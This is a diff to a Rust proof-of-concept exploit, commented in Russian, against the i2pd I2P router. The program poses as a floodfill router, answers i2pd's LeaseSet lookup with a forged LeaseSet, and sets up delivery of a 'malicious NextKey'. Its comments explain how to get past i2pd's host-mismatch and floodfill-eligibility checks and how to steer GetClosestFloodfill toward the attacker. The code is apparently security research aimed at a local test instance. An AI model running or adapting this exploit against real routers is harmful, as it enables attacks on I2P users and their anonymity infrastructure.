@@ -68,9 +68,24 @@
 //! i2pd (`127.0.0.1:4445`) — её надо выполнить в другом терминале, это и
 //! есть триггер: без запроса к адресу i2pd не полезет за `LeaseSet`.
 //!
+//! ## Тонкости, на которых POC уже спотыкался
+//!
+//! - **Адрес в RI обязан совпадать с фактическим endpoint'ом сессии.**
+//!   i2pd рвёт `SessionConfirmed`, если опубликованный хост не равен
+//!   адресу, с которого пришла сессия (`SSU2Session.cpp:1400`, лог
+//!   `SSU2: Host mismatch between published address ... and actual
+//!   endpoint ...`). Поэтому мы публикуем **loopback** — то же, куда
+//!   i2pd отвечает. Loopback проходит только потому, что в конфиге
+//!   тестового i2pd `reservedrange = false`
+//!   (`Transports::IsInReservedRange` = `IsCheckReserved() && ...`).
+//! - **netDb тестового i2pd надо чистить** перед прогоном: в
+//!   `m_Floodfills` не должно быть чужих/устаревших роутеров, иначе
+//!   `GetClosestFloodfill` выберет не нас. Это делает `run-ssu2.sh`
+//!   (`rm -rf datadir/netDb datadir/peerProfiles`).
+//!
 //! Логи i2pd: `grep -a "next key\|LeaseSet\|DatabaseLookup" /tmp/opencode/i2pd-ssu2.log | tail`.
 
-use std::net::{IpAddr, SocketAddr};
+use std::net::{IpAddr, Ipv4Addr, SocketAddr};
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
 
 use tokio::net::UdpSocket;
@@ -79,8 +94,8 @@ use tracing::{info, warn};
 use tracing_subscriber::{EnvFilter, fmt};
 
 use uu_i2p::{
-    EciesGarlicClove, IdentHash,
-    config::RouterConfig,
+    EciesGarlicClove, I2PTag, IdentHash,
+    config::{DEFAULT_NET_ID, DEFAULT_VERSION},
     crypto::{I2PX25519Keys, NoiseSymmetricState, init_noise_n_state},
     database_lookup::DatabaseLookup,
     database_store::DatabaseStore,
@@ -94,7 +109,8 @@ use uu_i2p::{
     lease::Lease,
     lease_set2::LeaseSet2,
     private_keys::I2PPrivateKeys,
-    router_info::FullRouterInfo,
+    router_info::{FullRouterInfo, RouterInfo, RouterInfoCaps, ri_caps},
+    router_info_address::I2PAddress,
     ssu2_pool::{Ssu2Event, Ssu2Local, Ssu2Pool},
     tunnel_messages::TunnelGatewayBody,
 };
@@ -146,7 +162,6 @@ fn array32(bytes: &[u8]) -> [u8; 32] {
 struct Args {
     ri_path: String,
     addr_override: Option<SocketAddr>,
-    advertise: Option<IpAddr>,
 }
 
 fn parse_args() -> Args {
@@ -155,10 +170,9 @@ fn parse_args() -> Args {
         .or_else(|| std::env::var("UU_I2P_LIVE_RI").ok());
     let Some(ri_path) = ri_path else {
         eprintln!(
-            "usage: uu-i2p-poc-i2pd-dest-nextkey <router.info> [host:port] [advertise-ip]\n\
+            "usage: uu-i2p-poc-i2pd-dest-nextkey <router.info> [host:port]\n\
              \n\
-             (или UU_I2P_LIVE_RI=/path/to/router.info, UU_I2P_LIVE_SSU2=host:port,\n\
-             UU_I2P_POC_ADVERTISE=ip)"
+             (или UU_I2P_LIVE_RI=/path/to/router.info, UU_I2P_LIVE_SSU2=host:port)"
         );
         std::process::exit(1);
     };
@@ -166,28 +180,10 @@ fn parse_args() -> Args {
         .nth(2)
         .or_else(|| std::env::var("UU_I2P_LIVE_SSU2").ok())
         .map(|s| s.parse::<SocketAddr>().expect("host:port"));
-    // Нужен *опубликованный* адрес: i2pd считает роутера флудфиллом
-    // только если у него есть published IPv4 (`IsEligibleFloodfill`).
-    let advertise = std::env::args()
-        .nth(3)
-        .or_else(|| std::env::var("UU_I2P_POC_ADVERTISE").ok())
-        .map(|s| s.parse::<IpAddr>().expect("advertise ip"))
-        .or_else(detect_lan_ipv4);
     Args {
         ri_path,
         addr_override,
-        advertise,
     }
-}
-
-/// Локальный не-loopback IPv4 (адрес исходящего интерфейса).
-///
-/// Пакеты никуда не уходят: `connect` на UDP только выбирает маршрут.
-fn detect_lan_ipv4() -> Option<IpAddr> {
-    let sock = std::net::UdpSocket::bind("0.0.0.0:0").ok()?;
-    sock.connect("192.0.2.1:9").ok()?; // TEST-NET-1, заведомо не наш
-    let ip = sock.local_addr().ok()?.ip();
-    (!ip.is_loopback()).then_some(ip)
 }
 
 /// Ждёт `Established`, попутно логируя прочие события.
@@ -270,8 +266,10 @@ impl Poc {
     /// Обрабатывает garlic от роутера i2pd: ждём `DatabaseLookup` за
     /// нашим `LeaseSet` и отвечаем `DatabaseStore`'ом.
     ///
-    /// `true`, если ответ отправлен.
-    async fn handle_router_garlic(&self, payload: &[u8]) -> Result<bool> {
+    /// Ответ на lookup — не финал: после него i2pd добавляет LS
+    /// (`Destination: New remote LeaseSet added`), поднимает поток к нам
+    /// и шлёт NS, поэтому цикл событий должен продолжать работать.
+    async fn handle_router_garlic(&self, payload: &[u8]) -> Result<()> {
         let body = GarlicBody::from_buffer(payload)?;
         let plain = decrypt_router_garlic(&self.router_priv, &self.router_pub, &body.payload)?;
         for block in parse_blocks(&plain)? {
@@ -294,10 +292,11 @@ impl Poc {
                 continue;
             }
             self.answer_lookup(&lookup).await?;
-            return Ok(true);
+            println!("  ждём NS от destination'а i2pd…");
+            return Ok(());
         }
         println!("garlic от роутера без нужного нам DatabaseLookup — пропускаем");
-        Ok(false)
+        Ok(())
     }
 
     /// Отвечает на `DatabaseLookup` нашим `LeaseSet2`.
@@ -458,7 +457,8 @@ impl Poc {
                     );
                     let done = match message.message_type() {
                         I2npMessageType::Garlic => {
-                            self.handle_router_garlic(message.payload()).await?
+                            self.handle_router_garlic(message.payload()).await?;
+                            false
                         }
                         I2npMessageType::TunnelGateway => {
                             self.handle_gateway(message.payload()).await?
@@ -487,9 +487,57 @@ struct Prepared {
     i2pd: IdentHash,
 }
 
+/// Наш `RouterInfo` — флудфилл с published SSU2v4-адресом на loopback.
+///
+/// Loopback здесь не лень, а необходимость: i2pd рвёт `SessionConfirmed`,
+/// если опубликованный хост не равен адресу, с которого пришла сессия
+/// (`SSU2Session.cpp:1400`, «Host mismatch»), а сессия у нас идёт через
+/// 127.0.0.1. Loopback считается допустимым published-хостом только
+/// потому, что в конфиге тестового i2pd `reservedrange = false`
+/// (`Transports::IsInReservedRange` = `IsCheckReserved() && ...`).
+/// Без published IPv4 i2pd не признает нас флудфиллом
+/// (`RouterInfo::IsEligibleFloodfill`), а нам нужно ровно это: чтобы он
+/// спросил у нас `LeaseSet` через `GetClosestFloodfill`.
+///
+/// `RouterConfig` тут не подходит: он намеренно запрещает публиковать
+/// loopback (для настоящего роутера это бессмысленный адрес), поэтому
+/// `RouterInfo` собираем сами.
+///
+/// # Errors
+///
+/// Ошибки генерации ключей, сборки и сериализации `RouterInfo`, разбора
+/// его в [`Ssu2Local::new`].
+fn build_local(
+    port: u16,
+    static_keys: I2PX25519Keys,
+    intro_key: [u8; 32],
+) -> Result<(Ssu2Local, I2PPrivateKeys)> {
+    let keys = I2PPrivateKeys::generate_default()?;
+    let address = I2PAddress::ssu2_published(
+        IpAddr::V4(Ipv4Addr::LOCALHOST),
+        port,
+        I2PTag::from_array(*static_keys.public_key()),
+        I2PTag::from_array(intro_key),
+    );
+    let caps = RouterInfoCaps {
+        bits: ri_caps::FLOODFILL,
+        ..RouterInfoCaps::default()
+    };
+    let body = RouterInfo::builder()
+        .timestamp(now_ms())
+        .add_address(address)
+        .caps(caps)
+        .version(DEFAULT_VERSION)
+        .net_id(i32::from(DEFAULT_NET_ID))
+        .build();
+    let ri_bytes = FullRouterInfo::from_keys(&keys, body)?.to_buffer()?;
+    let local = Ssu2Local::new(static_keys, intro_key, ri_bytes, DEFAULT_NET_ID, false)?;
+    Ok((local, keys))
+}
+
 /// Собирает ключи, `RouterInfo` (флудфилл с published-адресом),
 /// фейковый destination и его `LeaseSet`.
-async fn prepare(args: &Args, advertise: IpAddr) -> Prepared {
+async fn prepare(args: &Args) -> Prepared {
     let ri_bytes = std::fs::read(&args.ri_path).expect("read RouterInfo");
     let remote_ri = FullRouterInfo::from_buffer(&ri_bytes).expect("parse RouterInfo");
     let i2pd = *remote_ri.ident_hash();
@@ -497,25 +545,18 @@ async fn prepare(args: &Args, advertise: IpAddr) -> Prepared {
     let socket = UdpSocket::bind("127.0.0.1:0").await.expect("bind udp");
     let local_addr = socket.local_addr().expect("local_addr");
     let static_keys = I2PX25519Keys::generate();
-    let mut iv = [0u8; 16];
-    rand::Rng::fill_bytes(&mut rand::rng(), &mut iv);
     let intro: [u8; 32] = rand::random();
-    let cfg = RouterConfig::builder()
-        .keys(I2PPrivateKeys::generate_default().expect("generate router keys"))
-        .ntcp2_keys(static_keys, iv)
-        .ssu2_intro_key(intro)
-        .listen_ssu2_published(local_addr, advertise)
-        .floodfill(true)
-        .build()
-        .expect("build RouterConfig");
-    let router_priv = array32(cfg.keys().crypto_private());
+    let (local, router_keys) =
+        build_local(local_addr.port(), static_keys, intro).expect("build our RouterInfo");
+    let router_priv = array32(router_keys.crypto_private());
     let router_pub = array32(
-        cfg.keys()
+        router_keys
             .public()
             .encryption_public_key()
             .expect("router encryption key"),
     );
-    let ours = *cfg.keys().public().ident_hash();
+    let ours = *router_keys.public().ident_hash();
+    let pool = Ssu2Pool::with_socket(socket, local).expect("Ssu2Pool");
 
     // Destination и его LeaseSet: lease указывает на нас (gateway = наш
     // роутер), tunnelID произвольный — TunnelGateway мы разбираем сами.
@@ -542,9 +583,6 @@ async fn prepare(args: &Args, advertise: IpAddr) -> Prepared {
         .build(&dest_keys)
         .expect("build LeaseSet2");
 
-    let local = Ssu2Local::from_router_config(&cfg, now_ms()).expect("Ssu2Local");
-    let pool = Ssu2Pool::with_socket(socket, local).expect("Ssu2Pool");
-
     println!("Наш роутер:      {}", ours.to_base64());
     println!("Наш destination: {}", dest_ident.to_base64());
     println!("Адрес:           {}.b32.i2p", dest_ident.to_base32());
@@ -552,7 +590,7 @@ async fn prepare(args: &Args, advertise: IpAddr) -> Prepared {
         "Lease:           gateway={} tunnel={tunnel_id}",
         ours.to_base64()
     );
-    println!("Advertise:       {advertise}:{}", local_addr.port());
+    println!("Published:       {}:{}", local_addr.ip(), local_addr.port());
     println!();
     println!("=== Триггер: попросить i2pd сходить на наш destination ===");
     println!(
@@ -592,19 +630,12 @@ async fn main() {
     let args = parse_args();
     println!("=== POC: i2pd-destination + вредоносный NextKey ===");
     println!("RouterInfo i2pd: {}", args.ri_path);
-    let Some(advertise) = args.advertise else {
-        eprintln!(
-            "не нашёл не-loopback IPv4 для published-адреса; укажи его третьим \
-             аргументом или через UU_I2P_POC_ADVERTISE"
-        );
-        std::process::exit(1);
-    };
     let Prepared {
         mut poc,
         ri_bytes,
         addr_override,
         i2pd,
-    } = prepare(&args, advertise).await;
+    } = prepare(&args).await;
 
     let ident = timeout(Duration::from_secs(20), async {
         match addr_override {
